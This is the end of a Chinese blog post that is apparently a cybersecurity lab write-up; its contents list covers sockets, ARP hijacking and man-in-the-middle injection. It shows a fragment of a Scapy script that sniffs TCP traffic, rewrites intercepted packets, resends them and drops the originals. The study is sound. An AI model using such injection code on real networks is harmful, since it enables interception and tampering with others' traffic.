new_packet[IP].chksum = <span class="literal">None</span></span><br><span class="line">            new_packet[TCP].chksum = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送修改后的数据包</span></span><br><span class="line">            send(new_packet)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 修改后的数据包已发送&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这里可以选择丢弃原来的数据包，阻止原包继续发送</span></span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># 拦截原数据包，不再发送原始的 ECHO 包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理TCP流量</span></span><br><span class="line">sniff(iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, <span class="built_in">filter</span>=<span class="string">&quot;tcp&quot;</span>, store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/06/08/ember-code-analysis/" rel="prev" title="ember-code-analysis">
      <i class="fa fa-chevron-left"></i> ember-code-analysis
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/06/24/malware-classification/" rel="next" title="malware-classification">
      malware-classification <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Intro-to-Cybersecurity"><span class="nav-number">1.</span> <span class="nav-text">Intro to Cybersecurity</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Building-a-Web-Server"><span class="nav-number">1.1.</span> <span class="nav-text">1. Building a Web Server</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-Program-that-exits"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 Program that exits</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-Program-that-creates-a-socket"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2 Program that creates a socket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-Program-that-binds-a-socket"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.3 Program that binds a socket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-Program-that-listens-on-a-socket"><span class="nav-number">1.1.4.</span> <span class="nav-text">1.4 Program that listens on a socket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-Program-that-accepts-a-connection"><span class="nav-number">1.1.5.</span> <span class="nav-text">1.5 Program that accepts a connection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-Program-that-statically-responds-to-an-HTTP-request"><span class="nav-number">1.1.6.</span> <span class="nav-text">1.6 Program that statically responds to an HTTP request</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request"><span class="nav-number">1.1.7.</span> <span class="nav-text">1.7 Program that dynamically responds to an HTTP GET request</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><span class="nav-number">1.1.8.</span> <span class="nav-text">1.7 Program that dynamically responds to multiple HTTP GET requests</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><span class="nav-number">1.1.9.</span> <span class="nav-text">1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-10-and-1-11-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-POST-GETrequests"><span class="nav-number">1.1.10.</span> <span class="nav-text">1.10 and 1.11 Multi-processed program that dynamically responds to multiple HTTP POST GETrequests</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Intercepting-Communication"><span class="nav-number">1.2.</span> <span class="nav-text">2. Intercepting Communication</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Connect-to-a-remote-host"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 Connect to a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Listen-for-a-connection-from-a-remote-host"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 Listen for a connection from a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Find-and-connect-to-a-remote-host"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 Find and connect to a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Find-and-connect-to-a-remote-host-on-a-large-network"><span class="nav-number">1.2.4.</span> <span class="nav-text">2.4 Find and connect to a remote host on a large network</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Monitor-traffic-from-a-remote-host"><span class="nav-number">1.2.5.</span> <span class="nav-text">2.5 Monitor traffic from a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Monitor-slow-traffic-from-a-remote-host"><span class="nav-number">1.2.6.</span> <span class="nav-text">2.6 Monitor slow traffic from a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Hijack-traffic-from-a-remote-host-by-configuring-your-network-interface"><span class="nav-number">1.2.7.</span> <span class="nav-text">2.7 Hijack traffic from a remote host by configuring your network interface</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-Manually-send-an-Ethernet-packet"><span class="nav-number">1.2.8.</span> <span class="nav-text">2.8 Manually send an Ethernet packet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-9-Manually-send-an-Internet-Protocol-packet"><span class="nav-number">1.2.9.</span> <span class="nav-text">2.9 Manually send an Internet Protocol packet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-10-Manually-send-a-Transmission-Control-Protocol-packet"><span class="nav-number">1.2.10.</span> <span class="nav-text">2.10 Manually send a Transmission Control Protocol packet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-11-Manually-perform-a-Transmission-Control-Protocol-handshake"><span class="nav-number">1.2.11.</span> <span class="nav-text">2.11 Manually perform a Transmission Control Protocol handshake</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-12-Manually-send-an-Address-Resolution-Protocol-packet"><span class="nav-number">1.2.12.</span> <span class="nav-text">2.12 Manually send an Address Resolution Protocol packet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-13-Hijack-traffic-from-a-remote-host-using-ARP"><span class="nav-number">1.2.13.</span> <span class="nav-text">2.13 Hijack traffic from a remote host using ARP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-14-Man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic"><span class="nav-number">1.2.14.</span> <span class="nav-text">2.14 Man-in-the-middle traffic between two remote hosts and inject extra traffic</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="theLonging"
      src="/images/touxiang.JPG">
  <p class="site-author-name" itemprop="name">theLonging</p>
  <div class="site-description" itemprop="description">不捨晝夜。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/chantchanH7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chantchanH7" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/562879980@qq.com" title="E-Mail → 562879980@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2023-07 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">theLonging</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">453k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">6:52</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>



    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
